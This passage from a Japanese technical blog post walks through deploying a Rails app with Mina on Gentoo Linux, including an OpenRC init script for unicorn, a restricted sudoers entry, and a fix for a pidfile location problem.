</span><span class='line'><span class="c1">#  - http://nadarei.co/mina/tasks</span>
</span><span class='line'><span class="c1">#  - http://nadarei.co/mina/settings</span>
</span><span class='line'><span class="c1">#  - http://nadarei.co/mina/helpers</span>
</span></code></pre></td></tr></table></div></figure>


<h3>shared_paths</h3>

<p><code>shared_paths</code>に指定されたファイル・ディレクトリは、デプロイしたときに&#8221;#{deploy_to}/shared&#8221;にシンボリックリンクが張られるようになる。例えば<code>config/database.yml</code>を指定すると、デプロイしたときに<code>/home/refxgroovin/current/config/database.yml</code>から<code>/home/refxgroovin/shared/config/database.yml</code>にリンクが張られる。これによってサーバーに依存するファイルをいちいち書き換える必要がなくなる（んだろう、たぶん）。</p>

<p>（※Minaはデプロイした最新版を&#8221;#{deploy_to}/current&#8221;とする。これもシンボリックリンクで、実体は<code>releases</code>フォルダ以下にある）</p>

<p>例えばRails 4.1の<code>config/secrets.yml</code>。これは<code>rails new</code>したときに生成される<code>.gitignore</code>に含まれていてリポジトリにはないはずである。ここで、<code>shared_paths</code>に<code>config/secrets.yml</code>を設定して実体を<code>shared/config/secrets.yml</code>に置いておけば、デプロイ時にシンボリックリンクが作成されるので捗る、と思う。（ちなみにRefixativeの場合は<a href="https://github.com/laserlemon/figaro">Figaro</a>で管理しているので<code>config/secrets.yml</code>はリポジトリに存在している。その内容は単に環境変数を見るだけのものである。この場合は代わりに<code>config/application.yml</code>が存在しないので、これを<code>shared_paths</code>に設定してある）</p>

<p>注意点としては、あくまで自動でリンクを張るだけであって実体に関しては何も関知しないので、それは自分で作成する必要がある。</p>

<h3>セットアップ</h3>

<p>その辺りの設定ができたら開発環境でセットアップのコマンドを発行する。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bundle exec mina setup to=production</span></code></pre></td></tr></table></div></figure>


<p><code>to=production</code>に関しては、今回はproduction/stagingを切り替えられるようにしたので必須である（デフォルトのままなら必要ない）。これでデプロイ先にはMinaのディレクトリ構造が生成され、sharedディレクトリ以下にいくつかファイルやディレクトリが生成される。</p>

<p>メッセージにあるとおり、<code>shared</code>以下のファイルは自分で編集しなければならないので、サーバー側で編集する。</p>

<h3>デプロイ</h3>

<p>ここまで終われば、開発環境に戻ってきて</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>bundle exec mina deploy to=production</span></code></pre></td></tr></table></div></figure>


<p>とする。このコマンドによってsshしてgit cloneして云々……が実行され、最後に<code>to :launch</code>で書いた内容が実行され、デプロイは終了する。上述の例だとここで独自のinitスクリプトを用いているのでそれを用意しておく必要があるが、デフォルトだと<code>restart.txt</code>をtouchして終わりなので、特に何も起きずに終了するはずである。</p>

<h1>サーバー側環境構築</h1>

<p>rbenvとかrubyのインストールは省略。そこでハマったのは前述の点くらいである。</p>

<h2>initスクリプトを書こう</h2>

<p>Gentoo Linuxでは標準でOpenRCというinitシステムを採用している。それを踏まえた上で、unicornのデーモンを管理するためのinitスクリプトを書く。書き方は<a href="http://www.gentoo.org/doc/en/handbook/handbook-x86.xml?part=2&amp;chap=4">Gentoo Linux Documentation &ndash; Initscripts</a>辺りを見たり、他のinitスクリプトを参考にする。今回は特にapache2とpostgresql-9.3を参考にして書いてみた。</p>

<figure class='code'><figcaption><span>&#8220;init script&#8221; (refxgroovin_init)</span> <a href='/downloads/code/refxgroovin_init'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
</pre></td><td class='code'><pre><code class=''><span class='line'><span class="c1">#!/sbin/runscript</span>
</span><span class='line'><span class="s-Atom">#</span> <span class="nv">Distributed</span> <span class="s-Atom">under</span> <span class="s-Atom">the</span> <span class="s-Atom">terms</span> <span class="s-Atom">of</span> <span class="s-Atom">the</span> <span class="nv">MIT</span> <span class="nv">License</span>
</span><span class='line'><span class="s-Atom">#</span> <span class="err">$</span><span class="nv">Header</span><span class="s-Atom">:</span> <span class="err">$</span>
</span><span class='line'>
</span><span class='line'><span class="s-Atom">extra_started_commands=</span><span class="s2">&quot;reload&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="s-Atom">description_graceful=</span><span class="s2">&quot;Reexecutes the running binary and stops the old master after the old workers finish their current request.&quot;</span>
</span><span class='line'><span class="s-Atom">description_gracefulstop=</span><span class="s2">&quot;Stops the server after the workers finish their current request.&quot;</span>
</span><span class='line'><span class="s-Atom">description_reload=</span><span class="s2">&quot;Reexecutes the running binary and stops the old master immediately.&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="nv">CONF</span><span class="s-Atom">=</span><span class="s2">&quot;${RC_SVCNAME#*.}&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="p">[</span> <span class="s2">&quot;${CONF}&quot;</span> <span class="o">==</span> <span class="s2">&quot;refxgroovin&quot;</span> <span class="p">]</span> <span class="s-Atom">&amp;&amp;</span> <span class="nv">CONF</span><span class="s-Atom">=&#39;production&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="s-Atom">if</span> <span class="p">[</span> <span class="s2">&quot;${CONF}&quot;</span> <span class="o">==</span> <span class="s2">&quot;production&quot;</span> <span class="p">];</span> <span class="s-Atom">then</span>
</span><span class='line'>  <span class="nv">REFXGROOVIN_BASE</span><span class="s-Atom">=</span><span class="s2">&quot;/home/refxgroovin/refixative&quot;</span>
</span><span class='line'><span class="s-Atom">else</span>
</span><span class='line'>  <span class="nv">REFXGROOVIN_BASE</span><span class="s-Atom">=</span><span class="s2">&quot;/home/refxgroovin/refixative-${CONF}&quot;</span>
</span><span class='line'><span class="s-Atom">fi</span>
</span><span class='line'><span class="nv">PIDFILE</span><span class="s-Atom">=</span><span class="s2">&quot;${REFXGROOVIN_BASE}/shared/pids/unicorn.pid&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="nv">RBENV_DIR</span><span class="s-Atom">=</span><span class="s2">&quot;/home/${REFXGROOVIN_USER}/.rbenv&quot;</span>
</span><span class='line'><span class="nv">PATH</span><span class="s-Atom">=</span><span class="s2">&quot;${RBENV_DIR}/bin:$PATH&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="nf">depend</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>  <span class="s-Atom">need</span> <span class="s-Atom">net</span> <span class="s-Atom">postgresql</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nf">start</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>  <span class="s-Atom">ebegin</span> <span class="s2">&quot;Starting Refixative groovin&#39;!! ${CONF} server&quot;</span>
</span><span class='line'>  <span class="s-Atom">start</span><span class="o">-</span><span class="s-Atom">stop</span><span class="o">-</span><span class="s-Atom">daemon</span> <span class="s-Atom">--start</span> <span class="s-Atom">\</span>
</span><span class='line'>      <span class="s-Atom">--name</span> <span class="s-Atom">unicorn_rails</span> <span class="s-Atom">\</span>
</span><span class='line'>      <span class="s-Atom">--chdir</span> <span class="err">$</span><span class="p">{</span><span class="nv">REFXGROOVIN_BASE</span><span class="p">}</span><span class="o">/</span><span class="s-Atom">current</span> <span class="s-Atom">\</span>
</span><span class='line'>      <span class="s-Atom">--user</span> <span class="err">$</span><span class="p">{</span><span class="nv">REFXGROOVIN_USER</span><span class="p">}</span> <span class="s-Atom">\</span>
</span><span class='line'>      <span class="s-Atom">--pidfile</span> <span class="err">$</span><span class="p">{</span><span class="nv">PIDFILE</span><span class="p">}</span> <span class="s-Atom">\</span>
</span><span class='line'>      <span class="s-Atom">--exec</span> <span class="s-Atom">rbenv</span> <span class="s-Atom">--</span> <span class="s-Atom">exec</span> <span class="s-Atom">bundle</span> <span class="s-Atom">exec</span> <span class="s-Atom">unicorn_rails</span> <span class="o">-</span><span class="s-Atom">c</span> <span class="s2">&quot;${REFXGROOVIN_BASE}/current/config/unicorn.rb&quot;</span> <span class="o">-</span><span class="nv">E</span> <span class="s-Atom">production</span> <span class="o">-</span><span class="nv">D</span>
</span><span class='line'>  <span class="s-Atom">eend</span> <span class="err">$</span><span class="s-Atom">?</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nf">stop</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>  <span class="s-Atom">local</span> <span class="s-Atom">seconds=</span><span class="err">$</span><span class="p">((</span> <span class="err">$</span><span class="p">{</span><span class="nv">GRACEFUL_TIMEOUT</span><span class="p">}</span> <span class="o">+</span> <span class="err">$</span><span class="p">{</span><span class="nv">FORCE_TIMEOUT</span><span class="p">}</span> <span class="p">))</span>
</span><span class='line'>  <span class="s-Atom">ebegin</span> <span class="s2">&quot;Stopping Refixative groovin&#39;!! ${CONF} server gracefully (this can take up to ${seconds} seconds)&quot;</span>
</span><span class='line'>  <span class="s-Atom">local</span> <span class="s-Atom">retries=</span><span class="s2">&quot;SIGQUIT/${GRACEFUL_TIMEOUT}&quot;</span>
</span><span class='line'>
</span><span class='line'>  <span class="s-Atom">if</span> <span class="p">[</span> <span class="s2">&quot;${FORCE_QUIT}&quot;</span> <span class="o">=</span> <span class="s2">&quot;YES&quot;</span> <span class="p">]</span> <span class="p">;</span> <span class="s-Atom">then</span>
</span><span class='line'>      <span class="s-Atom">einfo</span> <span class="s2">&quot;FORCE_QUIT enabled.&quot;</span>
</span><span class='line'>      <span class="s-Atom">retries=</span><span class="s2">&quot;${retries}/SIGTERM/${FORCE_TIMEOUT}&quot;</span>
</span><span class='line'>  <span class="s-Atom">fi</span>
</span><span class='line'>
</span><span class='line'>  <span class="s-Atom">start</span><span class="o">-</span><span class="s-Atom">stop</span><span class="o">-</span><span class="s-Atom">daemon</span> <span class="s-Atom">--stop</span> <span class="s-Atom">\</span>
</span><span class='line'>      <span class="s-Atom">--pidfile</span> <span class="err">$</span><span class="p">{</span><span class="nv">PIDFILE</span><span class="p">}</span> <span class="s-Atom">\</span>
</span><span class='line'>      <span class="s-Atom">--retry</span> <span class="s2">&quot;${retries}&quot;</span>
</span><span class='line'>  <span class="s-Atom">eend</span> <span class="err">$</span><span class="s-Atom">?</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nf">restart</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>  <span class="s-Atom">stop</span>
</span><span class='line'>
</span><span class='line'>  <span class="s-Atom">local</span> <span class="s-Atom">timeout=</span><span class="err">$</span><span class="p">{</span><span class="nv">RESTART_TIMEOUT</span><span class="p">:-</span><span class="m">10</span><span class="p">}</span>
</span><span class='line'>  <span class="s-Atom">local</span> <span class="s-Atom">i</span><span class="o">=</span><span class="m">0</span> <span class="s-Atom">retval</span><span class="o">=</span><span class="m">0</span>
</span><span class='line'>  <span class="s-Atom">while</span> <span class="p">[</span> <span class="o">-</span><span class="s-Atom">e</span> <span class="err">$</span><span class="p">{</span><span class="nv">PIDFILE</span><span class="p">}</span> <span class="p">]</span> <span class="s-Atom">&amp;&amp;</span> <span class="p">[</span> <span class="err">$</span><span class="s-Atom">i</span> <span class="o">-</span><span class="s-Atom">lt</span> <span class="err">$</span><span class="p">{</span><span class="s-Atom">timeout</span><span class="p">}</span> <span class="p">]</span> <span class="p">;</span> <span class="s-Atom">do</span>
</span><span class='line'>      <span class="s-Atom">sleep</span> <span class="m">1</span> <span class="s-Atom">&amp;&amp;</span> <span class="s-Atom">i=</span><span class="err">$</span><span class="p">(</span><span class="s-Atom">expr</span> <span class="err">$</span><span class="s-Atom">i</span> <span class="o">+</span> <span class="m">1</span><span class="p">)</span>
</span><span class='line'>  <span class="s-Atom">done</span>
</span><span class='line'>  <span class="p">[</span> <span class="o">-</span><span class="s-Atom">e</span> <span class="err">$</span><span class="p">{</span><span class="nv">PIDFILE</span><span class="p">}</span> <span class="p">]</span> <span class="s-Atom">&amp;&amp;</span> <span class="s-Atom">retval</span><span class="o">=</span><span class="m">1</span>
</span><span class='line'>  <span class="s-Atom">eend</span> <span class="err">$</span><span class="p">{</span><span class="s-Atom">retval</span><span class="p">}</span> <span class="s2">&quot;Unable to confirm whether the server stopped or not.&quot;</span>
</span><span class='line'>  <span class="p">[</span> <span class="err">$</span><span class="p">{</span><span class="s-Atom">retval</span><span class="p">}</span> <span class="o">-</span><span class="s-Atom">ne</span> <span class="m">0</span> <span class="p">]</span> <span class="s-Atom">&amp;&amp;</span> <span class="s-Atom">return</span> <span class="err">$</span><span class="p">{</span><span class="s-Atom">retval</span><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="s-Atom">sleep</span> <span class="m">2</span> <span class="s-Atom">#</span> <span class="s-Atom">waiting</span> <span class="s-Atom">a</span> <span class="s-Atom">little</span> <span class="s-Atom">for</span> <span class="nv">COMPLETELY</span> <span class="s-Atom">stopped</span> <span class="s-Atom">the</span> <span class="s-Atom">old</span> <span class="s-Atom">master</span>
</span><span class='line'>
</span><span class='line'>  <span class="s-Atom">start</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="nf">reload</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>  <span class="s-Atom">local</span> <span class="s-Atom">retval</span><span class="o">=</span><span class="m">0</span>
</span><span class='line'>
</span><span class='line'>  <span class="s-Atom">ebegin</span> <span class="s2">&quot;Reloading Refixative groovin&#39;!! ${CONF} server&quot;</span>
</span><span class='line'>  <span class="s-Atom">kill</span> <span class="o">-</span><span class="nv">USR2</span> <span class="err">`</span><span class="s-Atom">cat</span> <span class="err">$</span><span class="p">{</span><span class="nv">PIDFILE</span><span class="p">}</span><span class="err">`</span>
</span><span class='line'>  <span class="s-Atom">retval=</span><span class="err">$</span><span class="s-Atom">?</span>
</span><span class='line'>  <span class="s-Atom">eend</span> <span class="err">$</span><span class="p">{</span><span class="s-Atom">retval</span><span class="p">}</span> <span class="s2">&quot;Unable to reload the server.&quot;</span>
</span><span class='line'>  <span class="p">[</span> <span class="err">$</span><span class="p">{</span><span class="s-Atom">retval</span><span class="p">}</span> <span class="o">-</span><span class="s-Atom">ne</span> <span class="m">0</span> <span class="p">]</span> <span class="s-Atom">&amp;&amp;</span> <span class="s-Atom">return</span> <span class="err">$</span><span class="p">{</span><span class="s-Atom">retval</span><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="s-Atom">local</span> <span class="s-Atom">timeout=</span><span class="err">$</span><span class="p">{</span><span class="nv">RELOAD_TIMEOUT</span><span class="p">:-</span><span class="m">10</span><span class="p">}</span>
</span><span class='line'>  <span class="s-Atom">local</span> <span class="s-Atom">oldbin=</span><span class="s2">&quot;${PIDFILE}.oldbin&quot;</span>
</span><span class='line'>  <span class="s-Atom">ebegin</span> <span class="s2">&quot;Waiting for restarting (this can take up to ${timeout} seconds)&quot;</span>
</span><span class='line'>  <span class="s-Atom">local</span> <span class="s-Atom">i</span><span class="o">=</span><span class="m">0</span>
</span><span class='line'>  <span class="s-Atom">retval</span><span class="o">=</span><span class="m">0</span>
</span><span class='line'>  <span class="s-Atom">while</span> <span class="p">[</span> <span class="p">!</span> <span class="o">-</span><span class="s-Atom">e</span> <span class="err">$</span><span class="p">{</span><span class="s-Atom">oldbin</span><span class="p">}</span> <span class="p">]</span> <span class="s-Atom">&amp;&amp;</span> <span class="p">[</span> <span class="err">$</span><span class="s-Atom">i</span> <span class="o">-</span><span class="s-Atom">lt</span> <span class="err">$</span><span class="p">{</span><span class="s-Atom">timeout</span><span class="p">}</span> <span class="p">]</span> <span class="p">;</span> <span class="s-Atom">do</span>
</span><span class='line'>      <span class="s-Atom">sleep</span> <span class="m">1</span> <span class="s-Atom">&amp;&amp;</span> <span class="s-Atom">i=</span><span class="err">$</span><span class="p">(</span><span class="s-Atom">expr</span> <span class="err">$</span><span class="s-Atom">i</span> <span class="o">+</span> <span class="m">1</span><span class="p">)</span>
</span><span class='line'>  <span class="s-Atom">done</span>
</span><span class='line'>  <span class="p">[</span> <span class="p">!</span> <span class="o">-</span><span class="s-Atom">e</span> <span class="err">$</span><span class="p">{</span><span class="s-Atom">oldbin</span><span class="p">}</span> <span class="p">]</span> <span class="s-Atom">&amp;&amp;</span> <span class="s-Atom">retval</span><span class="o">=</span><span class="m">1</span>
</span><span class='line'>  <span class="s-Atom">eend</span> <span class="err">$</span><span class="p">{</span><span class="s-Atom">retval</span><span class="p">}</span> <span class="s2">&quot;Unable to found the old pidfile at ${oldbin}&quot;</span>
</span><span class='line'>  <span class="p">[</span> <span class="err">$</span><span class="p">{</span><span class="s-Atom">retval</span><span class="p">}</span> <span class="o">-</span><span class="s-Atom">ne</span> <span class="m">0</span> <span class="p">]</span> <span class="s-Atom">&amp;&amp;</span> <span class="s-Atom">return</span> <span class="err">$</span><span class="p">{</span><span class="s-Atom">retval</span><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="s-Atom">ebegin</span> <span class="s2">&quot;Stopping old Refixative groovin&#39;!! ${CONF} server&quot;</span>
</span><span class='line'>  <span class="s-Atom">kill</span> <span class="o">-</span><span class="nv">QUIT</span> <span class="err">`</span><span class="s-Atom">cat</span> <span class="err">$</span><span class="p">{</span><span class="s-Atom">oldbin</span><span class="p">}</span><span class="err">`</span>
</span><span class='line'>  <span class="s-Atom">eend</span> <span class="err">$</span><span class="s-Atom">?</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="s-Atom">#</span> <span class="nn">vim</span><span class="p">:</span> <span class="s-Atom">ts</span><span class="o">=</span><span class="m">4</span> <span class="s-Atom">filetype</span><span class="o">=</span><span class="s-Atom">gentoo</span><span class="o">-</span><span class="s-Atom">init</span><span class="o">-</span><span class="s-Atom">d</span>
</span></code></pre></td></tr></table></div></figure>


<p><code>reload</code>はUSR2+QUITの組み合わせでダウンタイムなしでの更新を行うものである。あと<code>restart</code>はタイミングの問題か何かで、前のmasterがリッスンしているポートを手放す前に新しいmasterが動き始めて起動に失敗することがあったので、とりあえず間に<code>sleep 2</code>を入れてある。ひとまずこれで安定して再起動できる。適当。</p>

<p>最初は強制的なstop（TERMシグナル）とgracefulなstop（QUITシグナル）を別のコマンドに分けていたのだが、<code>stop()</code>のときに呼ばれる処理が<code>gracefulstop()</code>とかにしてしまうと呼ばれないために、gracefulstopしてもサービスが停止していないと判断されてしまった。そんなわけで、postgresqlのスクリプトを参考にしてstopを書き換えた。<code>start-stop-daemon</code>は<code>--retry</code>オプションに所定の形式のリストを渡すと、最初の要素から順に指定されたタイムアウト分だけ待ちながらシグナルを送ってくれる。これを用いて、最初はQUITを送り、それから一定時間経っても終了出来なければTERMを送るような処理になっている。</p>

<p>こんな感じのスクリプトを<code>/etc/init.d/refxgroovin</code>として作成して、あといくつか変数を定義したファイルを<code>/etc/conf.d/refxgroovin</code>として作成する。conf.dの方では<code>REFXGROOVIN_USER</code>の設定が必須である。これ以外にいくつかのタイムアウトの設定を行う。そうしたら</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>/etc/init.d/refxgroovin start</span></code></pre></td></tr></table></div></figure>


<p>としてサービスを起動させる。これでログを確認してmasterがreadyになっていて、かつ<code>curl</code>か何かでリクエストを投げて返事が返ってくれば成功である。</p>

<h3>stagingの話</h3>

<p>ところで今回はstaging環境にも対応させている。initスクリプトは<code>refxgroovin.(env)</code>という名前で<code>refxgroovin</code>へのシンボリックリンクを張ればおしまいである。つまり、<code>refxgroovin.staging</code>という名前でシンボリックリンクを作成すると、それがstaging環境向けのinitスクリプトになる。</p>

<p>conf.dの方はシンボリックリンクではなくコピーで対応する。</p>

<h2>sudoers</h2>

<p>デプロイが完了したとき、refxgroovinユーザーでサービスの再起動またはreloadが出来ればよい。しかしながらサービスの操作というのは当然スーパーユーザーでないとできない。そこでsudoである。でもrefxgroovinユーザーはunicornを動かすので、仮にunicornやRails、アプリケーション自身に任意コマンド実行の脆弱性があった場合、sudoから何かされる可能性がある。だからといってrefxgroovinユーザーにパスワードを設定するとデプロイする度にパスワードを入力しなきゃいけなくて、それは面倒（ここは運用方針に依存する気がするけど）。</p>

<p>そういうわけで、refxgroovinユーザーに対しては「任意のユーザーとして、パスワードなしで、/etc/init.d/refxgroovinと/etc/init.d/refxgroovin.stagingの実行のみを許可する」ように設定する。</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>refxgroovin ALL = (ALL) NOPASSWD: /etc/init.d/refxgroovin, (ALL) NOPASSWD: /etc/init.d/refxgroovin.staging</span></code></pre></td></tr></table></div></figure>


<p>を<code>visudo</code>で追記する。<code>(ALL) NOPASSWD:</code>は2回書かなくてよかったような気もするのだが、何か動かなかったので2回書いてある（他に原因があったかもしれない）。</p>

<p>この状態で一度試しにサーバー上で</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>sudo /etc/init.d/refxgroovin reload</span></code></pre></td></tr></table></div></figure>


<p>とかやって動くかどうかを確認する。動かなかったらググってみるとかmanを読むとかしてほしい。</p>

<p>ひとまずこれでrefxgroovinユーザーがroot（とか他のユーザー権限）で出来ることはinitスクリプトを使ってrefxgroovinデーモンを操作することだけになった、はずである。たぶん。</p>

<p>ちゃんと動いたならば、<code>deploy.rb</code>の<code>to :launch</code>を書き換える。上記の例のように<code>queue</code>を使って<code>sudo</code>を呼べばよい。編集したらデプロイしてみて、ちゃんとデプロイが成功するかどうかを確認する。</p>

<p>私は当初unicornのpidfileをデフォルトの位置に設定していたが、この設定ではreloadが失敗した。</p>

<p>pidfileのデフォルトの位置は<code>#{APPROOT}/tmp/pids/unicorn.rb</code>だが（今回であれば<code>APPROOT</code>は<code>/home/refxgroovin/current</code>）、Minaがlaunchを試みるのは<em>currentが最新版のコードベースに置き換わった後</em>である。つまり、例えば元々<code>releases/4</code>がcurrentだったとして、その状態でデプロイして<code>to :launch</code>が動くのはcurrentが<code>releases/5</code>に置き換わった後になる。要はpidfileはreleases/4/tmp/pidsにあるのに、releases/5/tmp/pidsを見に行ってしまう。当然そこには何もないのでpidfileがないといって失敗する。</p>

<p>そんなわけで明示的に、かつデプロイ時にシンボリックリンクとかで実体の位置が変わらない場所にpidfileの場所を設定しておく必要がある。今回の場合は<code>shared/pids/unicorn.pid</code>にした。shared以下に配置しているが、<code>shared_paths</code>には設定していない（こういう使い方がMina的にOKなのかは知らない）。またディレクトリ自体がないと起動に失敗するので、setup時に<code>shared/pids</code>ディレクトリを作成するようにした。</p>
</div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="2">&larr; Older</a>
    
    <a href="/blog/archives/"> Archives </a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section id="titles">
  <h1 id="site_title"><a href="http://tech.aquarite.info" title="Hello (forgotten) world">Hello (forgotten) world</a></h1>
  <h3 id="site_subtitle">Kogasa-chan is kawaii.</h3>
</section>

<section id="menu">
  <ul>
    <li><i class="fa fa-home fa-lg"></i><a href="http://tech.aquarite.info"> Home </a></li>
    <li><i class="fa fa-calendar fa-lg"></i><a href="http://tech.aquarite.info/blog/archives/"> Archives </a></li>
    <li><i class="fa fa-user fa-lg"></i><a href="http://tech.aquarite.info/about/"> About </a></li>
    <li><i class="fa fa-rss fa-lg"></i><a href="http://tech.aquarite.info/atom.xml"> Feed </a></li>
  </ul>
</section>

<section id="social">
  

  

  

  
    <a href="https://github.com/mayth" title="mayth"><i class="fa fa-github fa-2x"></i></a>
  

  

  
    <a href="https://twitter.com/maytheplic" title="maytheplic"><i class="fa fa-twitter fa-2x"></i></a>
  
</section>


<section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2014/11/24/tkbctf4-amida/">tkbctf4 [misc 400] amida</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/11/24/tkbctf4-cheerofcpu/">tkbctf4 [bin300] Cheer of CPU</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/10/17/sublime-latex-yosemite/">YosemiteでSublime Text 3 + LaTeXToolsを使ったらPDF出てこない話</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/09/23/csawctf2014-forensics/">CSAW CTF 2014 Quals Forensics</a>
      </li>
    
      <li class="post">
        <a href="/blog/2014/09/22/csawctf2014-trivia/">CSAW CTF 2014 Quals Trivia</a>
      </li>
    
  </ul>
</section>

<section>
  <h1>GitHub Repos</h1>
  <ul id="gh_repos">
    <li class="loading">Status updating&#8230;</li>
  </ul>
  
  <a href="https://github.com/mayth">@mayth</a> on GitHub
  
  <script type="text/javascript">
    $.domReady(function(){
        if (!window.jXHR){
            var jxhr = document.createElement('script');
            jxhr.type = 'text/javascript';
            jxhr.src = '/javascripts/libs/jXHR.js';
            var s = document.getElementsByTagName('script')[0];
            s.parentNode.insertBefore(jxhr, s);
        }

        github.showRepos({
            user: 'mayth',
            count: 0,
            skip_forks: true,
            target: '#gh_repos'
        });
    });
  </script>
  <script src="/javascripts/github.js" type="text/javascript"> </script>
</section>





  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2014 - Mei Akizuru -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
